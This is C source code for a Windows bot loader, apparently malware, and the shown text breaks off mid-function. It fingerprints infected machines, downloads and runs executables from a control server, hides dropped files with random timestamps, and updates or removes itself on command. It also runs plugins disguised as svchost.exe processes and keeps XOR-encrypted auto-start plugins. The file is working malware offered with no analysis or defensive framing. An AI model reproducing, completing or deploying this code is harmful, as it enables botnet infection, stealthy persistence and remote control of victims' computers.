#include "loader.h"

#if _WIN64
    PBOT_INFO64 pbi = NULL;
#elif _WIN32
    PBOT_INFO32 pbi = NULL;
#endif

HANDLE hMutex = NULL;
HANDLE hWatchThread = NULL;
HANDLE hPluginThread = NULL;
HANDLE hWorkThread = NULL;
BOOL bStopWatching = FALSE;

DWORD dwID = 0;
DWORD dwNAT = 0;
DWORD dwDomain = 0;
DWORD dwUptime = 0;
DWORD dwLastInput = 0;
DWORD dwOS = 0;
DWORD dwRights = 0;
DWORD dwCapacity = 0;
DWORD dwProcNumber = 0;
DWORD dwProc = 0;
DWORD dwRAM = 0;
DWORD dwGPU = 0;


BOOL GetMachineParams(
    LPDWORD lpdwNAT,
    LPDWORD lpdwDomain,
    LPDWORD lpdwUptime,
    LPDWORD lpdwLastInput,
    LPDWORD lpdwOS,
    LPDWORD lpdwRights,
    LPDWORD lpdwCapacity,
    LPDWORD lpdwProcNumber,
    LPDWORD lpdwProc,
    LPDWORD lpdwRAM,
    LPDWORD lpdwGPU
)
{
    OSVERSIONINFOEX ov;
    SYSTEM_INFO si;
    MEMORYSTATUSEX ms;
    LASTINPUTINFO li;
    NET_API_STATUS nStatus = 0;
    HKEY hKey = NULL;
    HMODULE hModule = NULL;
    HRESULT hr = S_OK;
    struct hostent *host = NULL;
    struct in_addr *addr = NULL;
    LPSERVER_INFO_101 psi = NULL;
    func_nvmlInit fn_nvmlInit = NULL;
    func_nvmlDeviceGetCount fn_nvmlDeviceGetCount = NULL;
    PWCHAR pwszCudaPath = NULL;
    PCHAR pszHost = NULL;
    DWORD dwEntriesRead = 0;
    DWORD dwTotalEntries = 0;
    DWORD dwResumeHandle = 0;
    DWORD dwRet = 0;
    DWORD dwSize = 0;
    DWORD dwTemp = 0;
    ULONG uIP = 0;
    UINT uiDevice = 0;
    BOOL bRet = FALSE;

    if (lpdwNAT == NULL || lpdwDomain == NULL || lpdwUptime == NULL || lpdwLastInput == NULL || lpdwOS == NULL || lpdwRights == NULL || lpdwCapacity == NULL || lpdwProcNumber == NULL || lpdwProc == NULL || lpdwRAM == NULL || lpdwGPU == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (*lpdwNAT == 0 && *lpdwDomain == 0 && *lpdwOS == 0 && *lpdwRights == 0 && *lpdwCapacity == 0 && *lpdwProcNumber == 0 && *lpdwProc == 0 && *lpdwRAM == 0 && *lpdwGPU == 0)
    {
        pszHost = (PCHAR)MemoryAllocate(NULL, MAX_PATH);
        if (pszHost == NULL)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (gethostname(pszHost, MemorySize(pszHost)) == SOCKET_ERROR)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, WSAGetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        host = gethostbyname(pszHost);
        if (host == NULL)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, WSAGetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        addr = (struct in_addr *)host->h_addr;
        if (addr == NULL)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        uIP = htonl(inet_addr(inet_ntoa(*addr)));

        if (htonl(inet_addr("10.0.0.0")) <= uIP && uIP <= htonl(inet_addr("10.255.255.255")))
        {
            *lpdwNAT = 1;
        }
        else if (htonl(inet_addr("169.254.0.0")) <= uIP && uIP <= htonl(inet_addr("169.254.255.255")))
        {
            *lpdwNAT = 1;
        }
        else if (htonl(inet_addr("172.16.0.0")) <= uIP && uIP <= htonl(inet_addr("172.31.255.255")))
        {
            *lpdwNAT = 1;
        }
        else if (htonl(inet_addr("192.168.0.0")) <= uIP && uIP <= htonl(inet_addr("192.168.255.255")))
        {
            *lpdwNAT = 1;
        }

        nStatus = NetServerEnum(NULL, 101, (LPBYTE *)&psi, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries, SV_TYPE_DOMAIN_CTRL, NULL, &dwResumeHandle);
        if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
        {
            if (dwEntriesRead > 0)
            {
                *lpdwDomain = 1;
            }
        }

        SecureZeroMemory(&ov, sizeof(OSVERSIONINFOEX));
        ov.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
        GetVersionEx((LPOSVERSIONINFO)&ov);

        if (ov.dwMajorVersion == 10 && ov.dwMinorVersion >= 0 && ov.wProductType == VER_NT_WORKSTATION) *lpdwOS = 9;
        if (ov.dwMajorVersion == 10 && ov.dwMinorVersion >= 0 && ov.wProductType != VER_NT_WORKSTATION) *lpdwOS = 8;
        if (ov.dwMajorVersion == 6 && ov.dwMinorVersion == 3 && ov.wProductType == VER_NT_WORKSTATION) *lpdwOS = 7;
        if (ov.dwMajorVersion == 6 && ov.dwMinorVersion == 2 && ov.wProductType == VER_NT_WORKSTATION) *lpdwOS = 7;
        if (ov.dwMajorVersion == 6 && ov.dwMinorVersion == 2 && ov.wProductType != VER_NT_WORKSTATION) *lpdwOS = 6;
        if (ov.dwMajorVersion == 6 && ov.dwMinorVersion == 3 && ov.wProductType != VER_NT_WORKSTATION) *lpdwOS = 6;
        if (ov.dwMajorVersion == 6 && ov.dwMinorVersion == 1 && ov.wProductType == VER_NT_WORKSTATION) *lpdwOS = 5;
        if (ov.dwMajorVersion == 6 && ov.dwMinorVersion == 1 && ov.wProductType != VER_NT_WORKSTATION) *lpdwOS = 4;
        if (ov.dwMajorVersion == 6 && ov.dwMinorVersion == 0 && ov.wProductType != VER_NT_WORKSTATION) *lpdwOS = 4;
        if (ov.dwMajorVersion == 6 && ov.dwMinorVersion == 0 && ov.wProductType == VER_NT_WORKSTATION) *lpdwOS = 3;
        if (ov.dwMajorVersion == 5 && ov.dwMinorVersion == 2) *lpdwOS = 2;
        if (ov.dwMajorVersion == 5 && ov.dwMinorVersion == 1) *lpdwOS = 1;
        if (ov.dwMajorVersion == 5 && ov.dwMinorVersion == 0) *lpdwOS = 0;

        *lpdwRights = IsProcessSystem(NULL) ? 0 : 1;

#if _WIN64
        *lpdwCapacity = 1;
#elif _WIN32
        *lpdwCapacity = 0;
#endif

        SecureZeroMemory(&si, sizeof(SYSTEM_INFO));
        GetSystemInfo(&si);
        *lpdwProcNumber = si.dwNumberOfProcessors;

        dwRet = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", NULL, KEY_READ, &hKey);
        if (dwRet != ERROR_SUCCESS)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, dwRet, __MODULE__, __FILE__);
            goto cleanup;
        }

        dwSize = sizeof(DWORD);

        dwRet = RegQueryValueExW(hKey, L"~MHz", NULL, NULL, (PBYTE)lpdwProc, &dwSize);
        if (dwRet != ERROR_SUCCESS)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, dwRet, __MODULE__, __FILE__);
            goto cleanup;
        }

        dwTemp = *lpdwProc % 100;
        if (dwTemp > 50)
        {
            *lpdwProc = (*lpdwProc / 100) * 100;
            *lpdwProc = *lpdwProc + 100;
        }
        else
        {
            *lpdwProc = (*lpdwProc / 100) * 100;
        }

        RegCloseKey(hKey) ? hKey = NULL : 0;

        SecureZeroMemory(&ms, sizeof(MEMORYSTATUSEX));
        ms.dwLength = sizeof(MEMORYSTATUSEX);
        GlobalMemoryStatusEx(&ms);

        *lpdwRAM = ms.ullTotalPhys / (1024 * 1024);
        dwTemp = *lpdwRAM % 1024;
        if (dwTemp > 512)
        {
            *lpdwRAM = (*lpdwRAM / 1024) * 1024;
            *lpdwRAM = *lpdwRAM + 1024;
        }
        else
        {
            *lpdwRAM = (*lpdwRAM / 1024) * 1024;
        }

        if (*lpdwRAM == 0)
        {
            *lpdwRAM = 1024;
        }

        hModule = LoadLibraryW(L"opencl.dll");
        if (hModule != NULL)
        {
            *lpdwGPU = 2;
        }

        pwszCudaPath = MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
        if (pwszCudaPath == NULL)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!GetEnvironmentVariableW(L"ProgramFiles", pwszCudaPath, (MemorySize(pwszCudaPath) - 2) / sizeof(WCHAR)))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        hr = StringCbPrintfW(pwszCudaPath, MemorySize(pwszCudaPath), L"%ls\\NVIDIA Corporation\\NVSMI\\nvml.dll", pwszCudaPath);
        if (FAILED(hr))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
            goto cleanup;
        }

        hModule = LoadLibraryW(pwszCudaPath);
        if (hModule != NULL)
        {
            fn_nvmlInit = (func_nvmlInit)GetProcAddress(hModule, "nvmlInit_v2");
            if (fn_nvmlInit != NULL)
            {
                fn_nvmlDeviceGetCount = (func_nvmlDeviceGetCount)GetProcAddress(hModule, "nvmlDeviceGetCount_v2");
                if (fn_nvmlDeviceGetCount != NULL)
                {
                    if (fn_nvmlInit() == 0)
                    {
                        if (fn_nvmlDeviceGetCount(&uiDevice) == 0)
                        {
                            if (uiDevice > 0)
                            {
                                *lpdwGPU = 1;
                            }
                        }
                    }
                }
            }
        }
    }

    *lpdwUptime = GetTickCount();
    *lpdwUptime = *lpdwUptime / (60 *1000);

    SecureZeroMemory(&li, sizeof(LASTINPUTINFO));
    li.cbSize = sizeof(LASTINPUTINFO);
    GetLastInputInfo(&li);
    *lpdwLastInput = (GetTickCount() - li.dwTime) / (60 *1000);

    bRet = TRUE;

cleanup:
    if (pwszCudaPath != NULL) MemoryFree(pwszCudaPath);
    if (pszHost != NULL) MemoryFree(pszHost);
    if (hKey != NULL) RegCloseKey(hKey);
    if (psi != NULL) NetApiBufferFree(psi);

    return bRet;
}


VOID DownloadAndExecute(PWCHAR pwszFile)
{
    HRESULT hr = S_OK;
    LPVOID lpFile = NULL;
    PWCHAR pwszProfileDir = NULL;
    PWCHAR pwszFilePath = NULL;
    DWORD dwFile = 0;
    BOOL bX64 = FALSE;

    if (pwszFile == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (pwszFile[0] == 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    lpFile = DownloadFile(pwszFile, &dwFile);
    if (lpFile == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!IsFilePE(lpFile, dwFile, &bX64))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

#if _WIN32
    if (bX64)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }
#endif

    pwszProfileDir = MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszProfileDir == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!GetEnvironmentVariableW(L"ALLUSERSPROFILE", pwszProfileDir, (MemorySize(pwszProfileDir) - 2) / sizeof(WCHAR)))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszFilePath = MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszFilePath == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hr = StringCbPrintfW(pwszFilePath, MemorySize(pwszFilePath), L"%ls\\%ls\\%ls", pwszProfileDir, PLUGIN_DIR, pwszFile);
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!WriteToFile(pwszFilePath, lpFile, dwFile))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    SetRandomFileTime(pwszFilePath);
    SetFileAttributesW(pwszFilePath, FILE_ATTRIBUTE_HIDDEN);

    if (!RunProcess(pwszFilePath, NULL, 0, NULL, NULL, NULL, NULL, IsProcessSystem(NULL) ? TRUE : FALSE))
    {
        if (IsProcessSystem(NULL))
        {
            if (!RunProcess(pwszFilePath, NULL, 0, NULL, NULL, NULL, NULL, FALSE))
            {
                TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
                goto cleanup;
            }
        }
        else
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }
    }

cleanup:
    if (lpFile != NULL) MemoryFree(lpFile);
    if (pwszProfileDir != NULL) MemoryFree(pwszProfileDir);
    if (pwszFilePath != NULL) MemoryFree(pwszFilePath);

    return;
}


VOID UpdateBot(DWORD dwTask, PWCHAR pwszFile)
{
    HRESULT hr = S_OK;
    LPVOID lpFile = NULL;
    PWCHAR pwszProfileDir = NULL;
    PWCHAR pwszFilePath = NULL;
    DWORD dwFile = 0;
    DWORD dwFinalTask = dwTask;
    DWORD dwFinalCommand = 0;
    BOOL bX64 = FALSE;

    if (dwTask == 0 || pwszFile == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (pwszFile[0] == 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    lpFile = DownloadFile(pwszFile, &dwFile);
    if (lpFile == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!IsFilePE(lpFile, dwFile, &bX64))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

#if _WIN32
    if (bX64)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }
#endif

    pwszProfileDir = MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszProfileDir == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!GetEnvironmentVariableW(L"ALLUSERSPROFILE", pwszProfileDir, (MemorySize(pwszProfileDir) - 2) / sizeof(WCHAR)))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszFilePath = MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszFilePath == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hr = StringCbPrintfW(pwszFilePath, MemorySize(pwszFilePath), L"%ls\\%ls\\%ls", pwszProfileDir, PLUGIN_DIR, LAUNCHER_NAME);
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
        goto cleanup;
    }

    bStopWatching = TRUE;
    WaitForSingleObject(hWatchThread, INFINITE);

    if (!WriteToFile(pwszFilePath, lpFile, dwFile))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    SetRandomFileTime(pwszFilePath);
    SetFileAttributesW(pwszFilePath, FILE_ATTRIBUTE_HIDDEN);

    if (!CloseHandle(hMutex))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    GetTask(dwID, dwNAT, dwDomain, dwUptime, dwLastInput, dwOS, dwRights, dwCapacity, dwProcNumber, dwProc, dwRAM, dwGPU, __VERSION__, __GROUP__, &dwFinalTask, &dwFinalCommand, pwszFile);

    if (!RunProcess(pwszFilePath, NULL, 0, NULL, NULL, NULL, NULL, FALSE))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    MemoryFree(lpFile);
    MemoryFree(pwszProfileDir);
    MemoryFree(pwszFilePath);
    ExitThread(0);

cleanup:
    if (lpFile != NULL) MemoryFree(lpFile);
    if (pwszProfileDir != NULL) MemoryFree(pwszProfileDir);
    if (pwszFilePath != NULL) MemoryFree(pwszFilePath);

    return;
}


VOID UninstallBot(DWORD dwTask, PWCHAR pwszFile)
{
    WIN32_FIND_DATA fd;
    HRESULT hr = S_OK;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    PWCHAR pwszProfileDir = NULL;
    PWCHAR pwszFilePath = NULL;
    DWORD dwFinalTask = dwTask;
    DWORD dwFinalCommand = 0;

    pwszProfileDir = MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszProfileDir == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!GetEnvironmentVariableW(L"ALLUSERSPROFILE", pwszProfileDir, (MemorySize(pwszProfileDir) - 2) / sizeof(WCHAR)))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszFilePath = MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszFilePath == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hr = StringCbPrintfW(pwszFilePath, MemorySize(pwszFilePath), L"%ls\\%ls", pwszProfileDir, LAUNCHER_NAME);
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
        goto cleanup;
    }

    bStopWatching = TRUE;
    WaitForSingleObject(hWatchThread, INFINITE);

    if (!CloseHandle(hMutex))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (IsProcessSystem(NULL))
    {
        if (!IsSystemModeAutorunInstalled())
        {
            UninstallSystemModeAutorun(pwszFilePath);
        }
    }
    else
    {
        if (!IsUserModeAutorunInstalled())
        {
            UninstallUserModeAutorun(pwszFilePath);
        }
    }

    if (!EraseFile(pwszFilePath))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hr = StringCbPrintfW(pwszFilePath, MemorySize(pwszFilePath), L"%ls\\%ls\\*", pwszProfileDir, PLUGIN_DIR);
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
        goto cleanup;
    }

    hFind = FindFirstFileW(pwszFilePath, &fd);
    if (hFind == INVALID_HANDLE_VALUE)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    do
    {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
        {
            hr = StringCbPrintfW(pwszFilePath, MemorySize(pwszFilePath), L"%ls\\%ls\\%ls", pwszProfileDir, PLUGIN_DIR, fd.cFileName);
            if (FAILED(hr))
            {
                TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
                goto cleanup;
            }

            if (!EraseFile(pwszFilePath))
            {
                TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            }
        }

    } while (FindNextFileW(hFind, &fd) != 0);

    FindClose(hFind);

    hr = StringCbPrintfW(pwszFilePath, MemorySize(pwszFilePath), L"%ls\\%ls", pwszProfileDir, PLUGIN_DIR);
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!RemoveDirectoryW(pwszFilePath))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
    }

    if (!DeleteMachineID())
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
    }

    GetTask(dwID, dwNAT, dwDomain, dwUptime, dwLastInput, dwOS, dwRights, dwCapacity, dwProcNumber, dwProc, dwRAM, dwGPU, __VERSION__, __GROUP__, &dwFinalTask, &dwFinalCommand, pwszFile);

    MemoryFree(pwszProfileDir);
    MemoryFree(pwszFilePath);
    FindClose(hFind);
    ExitThread(0);

cleanup:
    if (pwszProfileDir != NULL) MemoryFree(pwszProfileDir);
    if (pwszFilePath != NULL) MemoryFree(pwszFilePath);
    if (hFind != INVALID_HANDLE_VALUE) FindClose(hFind);

    return;
}


VOID PluginStart(PWCHAR pwszFile)
{
    HRESULT hr = S_OK;
    LPVOID lpFile = NULL;
    PWCHAR pwszPluginName = NULL;
    PWCHAR pwszProfileDir = NULL;
    PWCHAR pwszFilePath = NULL;
    DWORD dwFile = 0;

    if (pwszFile == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (pwszFile[0] == 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszPluginName = MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszPluginName == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

#if _WIN64
    hr = StringCbPrintfW(pwszPluginName, MemorySize(pwszPluginName), L"%ls64", pwszFile);
#elif _WIN32
    hr = StringCbPrintfW(pwszPluginName, MemorySize(pwszPluginName), L"%ls32", pwszFile);
#endif
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszProfileDir = MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszProfileDir == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!GetEnvironmentVariableW(L"ALLUSERSPROFILE", pwszProfileDir, (MemorySize(pwszProfileDir) - 2) / sizeof(WCHAR)))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszFilePath = MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszFilePath == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hr = StringCbPrintfW(pwszFilePath, MemorySize(pwszFilePath), L"%ls\\%ls\\%ls", pwszProfileDir, PLUGIN_DIR, pwszPluginName);
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
        goto cleanup;
    }

    if (GetStealthProcessPID(L"svchost.exe", pwszPluginName, FALSE) == 0)
    {
        lpFile = DownloadFile(pwszPluginName, &dwFile);
        if (lpFile == NULL)
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!IsFilePE(lpFile, dwFile, NULL))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!LaunchPlugin(pwszPluginName, lpFile, dwFile))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (StrCmpNIW(pwszPluginName, L"auto_", (sizeof(L"auto_") - 2) / sizeof(WCHAR)) == 0)
        {
            if (!XorData(lpFile, dwFile / sizeof(DWORD), DECRYPT_KEY))
            {
                TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
                goto cleanup;
            }

            if (!WriteToFile(pwszFilePath, lpFile, dwFile))
            {
                TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
                goto cleanup;
            }

            SetRandomFileTime(pwszFilePath);
            SetFileAttributesW(pwszFilePath, FILE_ATTRIBUTE_HIDDEN);
        }
    }

cleanup:
    if (lpFile != NULL) MemoryFree(lpFile);
    if (pwszPluginName != NULL) MemoryFree(pwszPluginName);
    if (pwszProfileDir != NULL) MemoryFree(pwszProfileDir);
    if (pwszFilePath != NULL) MemoryFree(pwszFilePath);

    return;
}


VOID PluginStop(PWCHAR pwszFile)
{
    HRESULT hr = S_OK;
    PWCHAR pwszPluginName = NULL;
    DWORD dwPID = 0;

    if (pwszFile == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (pwszFile[0] == 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszPluginName = MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszPluginName == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

#if _WIN64
    hr = StringCbPrintfW(pwszPluginName, MemorySize(pwszPluginName), L"%ls64", pwszFile);
#elif _WIN32
    hr = StringCbPrintfW(pwszPluginName, MemorySize(pwszPluginName), L"%ls32", pwszFile);
#endif
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
        goto cleanup;
    }

    dwPID = GetStealthProcessPID(L"svchost.exe", pwszPluginName, FALSE);
    if (dwPID != 0)
    {
        if (!KillProcess(dwPID))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }
    }

cleanup:
    if (pwszPluginName != NULL) MemoryFree(pwszPluginName);

    return;
}


VOID PluginUpdate(PWCHAR pwszFile)
{
    HRESULT hr = S_OK;
    LPVOID lpFile = NULL;
    PWCHAR pwszPluginName = NULL;
    PWCHAR pwszProfileDir = NULL;
    PWCHAR pwszFilePath = NULL;
    DWORD dwFile = 0;
    DWORD dwPID = 0;

    if (pwszFile == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (pwszFile[0] == 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszPluginName = MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszPluginName == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

#if _WIN64
    hr = StringCbPrintfW(pwszPluginName, MemorySize(pwszPluginName), L"%ls64", pwszFile);
#elif _WIN32
    hr = StringCbPrintfW(pwszPluginName, MemorySize(pwszPluginName), L"%ls32", pwszFile);
#endif
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszProfileDir = MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszProfileDir == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!GetEnvironmentVariableW(L"ALLUSERSPROFILE", pwszProfileDir, (MemorySize(pwszProfileDir) - 2) / sizeof(WCHAR)))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszFilePath = MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszFilePath == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hr = StringCbPrintfW(pwszFilePath, MemorySize(pwszFilePath), L"%ls\\%ls\\%ls", pwszProfileDir, PLUGIN_DIR, pwszPluginName);
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
        goto cleanup;
    }

    dwPID = GetStealthProcessPID(L"svchost.exe", pwszPluginName, FALSE);
    if (dwPID != 0)
    {
        if (!KillProcess(dwPID))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!EraseFile(pwszFilePath))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        }
    }

    lpFile = DownloadFile(pwszPluginName, &dwFile);
    if (lpFile == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!IsFilePE(lpFile, dwFile, NULL))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!LaunchPlugin(pwszPluginName, lpFile, dwFile))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (StrCmpNIW(pwszPluginName, L"auto_", (sizeof(L"auto_") - 2) / sizeof(WCHAR)) == 0)
